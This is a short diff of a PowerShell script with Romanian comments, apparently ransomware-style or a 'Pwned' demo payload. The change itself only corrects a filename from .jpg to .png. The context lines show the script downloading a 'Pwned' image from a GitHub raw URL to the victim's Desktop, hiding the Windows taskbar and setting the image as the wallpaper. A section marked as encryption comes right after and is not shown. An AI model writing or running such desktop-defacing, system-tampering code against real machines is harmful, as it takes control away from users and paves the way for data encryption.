@@ -23,7 +23,7 @@ public class Taskbar {
 
 Try{
 
-# Descarca imaginea Pwned.jpg
+# Descarca imaginea Pwned.png
 $url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Pwned.png"
 $output = "$env:USERPROFILE\Desktop\Pwned.png"
 $webClient = New-Object System.Net.WebClient
@@ -75,7 +75,7 @@ $taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
 [Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_HIDE)
 
 # Seteaza imaginea descarcata ca desktop background
-[Wallpaper]::SystemParametersInfo(20, 0, "$env:USERPROFILE\Desktop\Pwned.jpg" , 3)
+[Wallpaper]::SystemParametersInfo(20, 0, "$env:USERPROFILE\Desktop\Pwned.png" , 3)
 
 
 ##Encriptie
